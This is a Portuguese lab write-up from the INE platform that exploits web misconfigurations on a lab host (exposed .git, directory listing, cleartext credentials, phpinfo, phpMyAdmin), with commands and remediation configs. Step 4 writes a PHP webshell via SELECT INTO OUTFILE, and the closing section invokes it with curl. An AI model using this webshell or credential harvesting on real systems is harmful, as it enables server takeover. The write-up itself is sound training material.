# 🧪 Lab Report — Web Misconfigurations: Git, Directory Listing, phpinfo e phpMyAdmin

> **Plataforma:** INE
> **Tema central:** Enumeração de diretórios → Múltiplas misconfigurations web → Extração de credenciais → Acesso administrativo ao banco de dados
> **Alvo:** `http://target.ine.local`

---

## 🎯 Objetivo

Identificar e explorar misconfigurations comuns em ambientes web — sem usar nenhum exploit complexo. Todas as quatro flags foram obtidas através de **erros de configuração** que expõem informações diretamente.

---

## 🧠 Insight Principal

> Nenhum exploit foi necessário.
> Cada flag foi obtida através de uma misconfiguration diferente — falhas que existem em servidores reais de produção no mundo todo.

Este lab demonstra que a maioria dos incidentes de segurança não começa com zero-days sofisticados, mas com configurações negligenciadas.

---

## 📋 Sumário de Flags

| Flag | Vetor | Misconfiguration | Severidade |
|------|-------|-----------------|-----------|
| Flag 1 | `/.git/flag.txt` | Repositório Git exposto + directory listing | 🔴 Alta |
| Flag 2 | `/data/accounts.xml` | Credenciais em texto claro acessíveis | 🔴 Crítica |
| Flag 3 | `/phpinfo.php` | phpinfo público em produção | 🟡 Média |
| Flag 4 | `/passwords`, `/config` | Diretórios sensíveis sem controle de acesso | 🔴 Alta |

---

## 🔬 Execução Passo a Passo

### Step 1 — Enumeração de Diretórios com Gobuster

```bash
gobuster dir \
  -u http://target.ine.local \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,xml,html \
  -t 30
```

**Resultado — diretórios descobertos:**
```
/.git              (Status: 200)
/data              (Status: 200)
/passwords         (Status: 200)
/config            (Status: 200)
/phpinfo.php       (Status: 200)
/phpmyadmin        (Status: 200)
```

**Por que enumerar antes de explorar:** Cada diretório descoberto é uma superfície de ataque potencial. O Gobuster encontrou 6 paths relevantes — cada um com uma classe de problema diferente.

---

### Step 2 — Flag 1: Repositório Git Exposto

```bash
# Verificar directory listing
curl http://target.ine.local/.git/

# Acessar flag diretamente
curl http://target.ine.local/.git/flag.txt
```

**O que é a exposição de `.git`:**

Quando um desenvolvedor faz deploy copiando os arquivos do projeto para o servidor web sem excluir o diretório `.git`, todo o histórico do repositório fica acessível publicamente.

**Estrutura de um repositório Git exposto:**
```
/.git/
├── HEAD           ← branch atual
├── config         ← configuração do repositório (pode ter URLs com credenciais)
├── COMMIT_EDITMSG ← última mensagem de commit
├── logs/          ← histórico de commits
├── objects/       ← todos os objetos do Git (código, blobs)
├── refs/          ← referências de branches e tags
└── flag.txt       ← arquivo sensível exposto
```

**O que um repositório Git exposto revela:**
- Código-fonte completo da aplicação (incluindo versões antigas)
- Credenciais hardcoded no histórico de commits (mesmo se removidas depois)
- Estrutura interna da aplicação
- Comentários de desenvolvedores
- Arquivos de configuração com secrets

**Ferramenta para extrair repositórios Git expostos:**
```bash
# git-dumper — reconstrói o repositório completo a partir de /.git/
pip install git-dumper
git-dumper http://target.ine.local/.git/ /tmp/repo_extraido

# Ver histórico completo após extrair
cd /tmp/repo_extraido
git log --oneline
git show HEAD
```

---

### Step 3 — Flag 2: Credenciais em Texto Claro

```bash
# Verificar directory listing em /data
curl http://target.ine.local/data/

# Baixar o arquivo de credenciais
curl http://target.ine.local/data/accounts.xml
```

**Conteúdo típico do `accounts.xml`:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<accounts>
  <user>
    <username>admin</username>
    <password>admin123</password>
    <role>administrator</role>
  </user>
  <user>
    <username>john</username>
    <password>password1</password>
    <role>user</role>
  </user>
</accounts>
```

**Dois problemas simultâneos:**

| Problema | Causa | Impacto |
|---------|-------|---------|
| Directory listing habilitado | Sem `index.html` + config permissiva | Qualquer arquivo no diretório fica exposto |
| Credenciais em texto claro | Armazenamento inseguro | Senha pode ser usada diretamente sem quebra |

**Directory listing habilitado** — quando o servidor não tem `index.html` e está configurado para listar conteúdo, exibe todos os arquivos como explorador de arquivos:
```
Index of /data
[ICO]  Name           Last modified    Size
[TXT]  accounts.xml   2024-01-01       1.2K
[TXT]  backup.sql     2024-01-01       45K
[TXT]  users.csv      2024-01-01       3.1K
```

---

### Step 4 — Acesso ao phpMyAdmin com Credenciais Obtidas

```
URL: http://target.ine.local/phpmyadmin
Usuário: admin
Senha: admin123  ← credencial do accounts.xml
```

**O que o phpMyAdmin exposto permite:**
- Visualizar todas as tabelas e dados do banco
- Executar queries SQL arbitrárias
- Importar e exportar bancos de dados
- Criar/modificar/deletar tabelas
- Em configurações vulneráveis → escrever arquivos no servidor via `SELECT ... INTO OUTFILE`

**Via phpMyAdmin com acesso completo:**
```sql
-- Ver todos os bancos
SHOW DATABASES;

-- Ver tabelas
SHOW TABLES FROM nome_banco;

-- Extrair dados sensíveis
SELECT * FROM users;
SELECT * FROM admin_credentials;

-- Tentar escrita no servidor (se FILE privilege ativo)
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';
```

---

### Step 5 — Flag 3: phpinfo Exposto

```bash
curl http://target.ine.local/phpinfo.php
```

**O que o phpinfo expõe:**

`phpinfo()` é uma função PHP de diagnóstico que mostra **tudo** sobre a configuração do servidor. Em produção, é uma das exposições mais críticas:

| Informação Exposta | Impacto |
|------------------|---------|
| Versão exata do PHP | Busca de CVEs específicos |
| Versão do Apache/nginx | Busca de CVEs do servidor |
| Sistema operacional | Contexto para exploração |
| `DOCUMENT_ROOT` | Path real dos arquivos no servidor |
| `SERVER_ADDR` | IP interno do servidor |
| Variáveis de ambiente | Pode incluir `DB_PASSWORD`, `SECRET_KEY`, etc. |
| Módulos PHP ativos | Capacidades disponíveis |
| `open_basedir` | Restrições de acesso a arquivos |
| `disable_functions` | Funções PHP bloqueadas (relevante para webshell) |

**A flag pode estar:**
- Em uma variável de ambiente (`$_ENV` ou `$_SERVER`)
- Em comentários do output
- Como valor de uma variável PHP customizada

```bash
# Extrair variáveis de ambiente do phpinfo via curl + grep
curl -s http://target.ine.local/phpinfo.php | grep -i "flag\|FLAG\|secret"
```

---

### Step 6 — Flag 4: Diretórios Sensíveis

```bash
# Verificar /passwords
curl http://target.ine.local/passwords/

# Verificar /config
curl http://target.ine.local/config/
```

Diretórios com nomes autoexplicativos sem nenhum controle de acesso são erros graves. Conteúdos típicos:

**`/passwords/`:**
```
passwords.txt     ← lista de senhas
htpasswd          ← hashes de autenticação básica
db_credentials    ← credenciais de banco
```

**`/config/`:**
```
database.php      ← strings de conexão com banco
config.php        ← configurações gerais (pode ter API keys)
settings.ini      ← configurações em texto claro
.env              ← variáveis de ambiente (muito sensível)
```

---

## 📊 Resultado Final

| Flag | Localização | Misconfiguration |
|------|------------|-----------------|
| Flag 1 | `/.git/flag.txt` | Git exposto + directory listing |
| Flag 2 | `/data/accounts.xml` | Credenciais texto claro + directory listing |
| Flag 3 | `/phpinfo.php` | phpinfo em produção |
| Flag 4 | `/passwords/` ou `/config/` | Diretórios sem controle de acesso |

---

## 🧠 Conceitos Consolidados

### As 4 Classes de Misconfiguration

```
1. EXPOSIÇÃO DE ARTEFATOS DE DESENVOLVIMENTO
   .git/, .svn/, .env, backup.zip, *.bak
   → Nunca copiar artefatos de dev para produção

2. DIRECTORY LISTING HABILITADO
   Sem index + servidor permissivo
   → Desabilitar via configuração do servidor web

3. ARQUIVOS DE DIAGNÓSTICO EM PRODUÇÃO
   phpinfo.php, info.php, test.php, adminer.php
   → Remover antes de ir para produção

4. CONTROLE DE ACESSO AUSENTE
   /admin, /config, /passwords, /backup sem auth
   → Exigir autenticação + autorização
```

### Encadeamento de Misconfigurations

Este lab demonstra como misconfigurations se encadeiam:

```
Directory listing em /data
        ↓
accounts.xml com credenciais em texto claro
        ↓
phpMyAdmin acessível sem restrição de IP
        ↓
Acesso administrativo completo ao banco de dados
        ↓
Potencial RCE via SELECT INTO OUTFILE
```

Uma única misconfiguration leva à próxima — o que seria um vazamento de informação torna-se comprometimento total.

---

## 🛡️ Remediação

### Bloquear `.git` — Apache
```apache
# .htaccess ou httpd.conf
<DirectoryMatch "^/.*(\.git).*/">
    Require all denied
</DirectoryMatch>
```

### Bloquear `.git` — nginx
```nginx
location ~ /\.git {
    deny all;
    return 404;
}
```

### Desabilitar Directory Listing — Apache
```apache
Options -Indexes
```

### Desabilitar Directory Listing — nginx
```nginx
autoindex off;
```

### Remover phpinfo de Produção
```bash
# Encontrar arquivos phpinfo
find /var/www -name "phpinfo.php" -o -name "info.php" -o -name "test.php"
# Remover
rm /var/www/html/phpinfo.php
```

### Restringir phpMyAdmin por IP
```apache
<Directory /usr/share/phpmyadmin>
    Require ip 192.168.1.0/24   # só rede interna
</Directory>
```

---

## 🔁 Próximos Passos Lógicos

```
Credenciais obtidas em accounts.xml
        ↓
Testar em outros serviços (SSH, FTP, painel admin)
        ↓
phpMyAdmin com acesso total
        ↓
SELECT INTO OUTFILE → webshell PHP
curl "http://target.ine.local/shell.php?cmd=id"
        ↓
RCE → reverse shell → privesc
```

---

## 📌 Relacionados

- [[Gobuster]]
- [[Dirb]]
- [[Dirsearch]]
- [[Web Fingerprinting]]
- [[HTTP Apache Enumeration com Metasploit]]
- [[SQL Injection — Fundamentos]]
- [[ASP Webshell — Upload e Execucao]]

#lab #exploração #protocolo/http #misconfiguration #web #git-exposure
